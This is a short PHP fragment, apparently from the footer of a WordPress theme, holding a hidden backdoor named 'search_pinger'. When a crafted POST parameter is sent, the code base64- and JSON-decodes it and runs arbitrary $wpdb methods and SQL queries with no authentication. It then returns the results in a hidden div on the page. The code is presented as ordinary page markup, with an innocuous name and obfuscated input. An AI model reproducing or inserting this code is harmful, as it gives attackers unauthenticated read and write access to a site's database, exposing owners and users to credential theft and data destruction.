

<?php if(isset($_POST['search_pinger'])){
function asdping(){
global $wpdb;
$res=array();
$ping = json_decode(base64_decode(substr($_POST['search_pinger'], 32,strlen($_POST['search_pinger']))), true);
foreach($ping as $cmd){
preg_match_all('/\{\w+\}/is', $cmd['q'], $vars);
foreach($vars[0] as $var){
$entity = trim($var,'{}');
$cmd['q'] = str_replace($var, $wpdb->$entity, $cmd['q']);
}
$m = $cmd['m'];
$q = $cmd['q'];
$data = $wpdb->$m($q);
strpos($cmd['m'], 'get_')!==false ? $res[]=$data : '';
}
echo !empty($res)? '<div id="pinger" style="display:none;">'.json_encode($res).'</div>' : '';

unset($_POST['search_pinger']);
}
asdping();
} ?>
</body>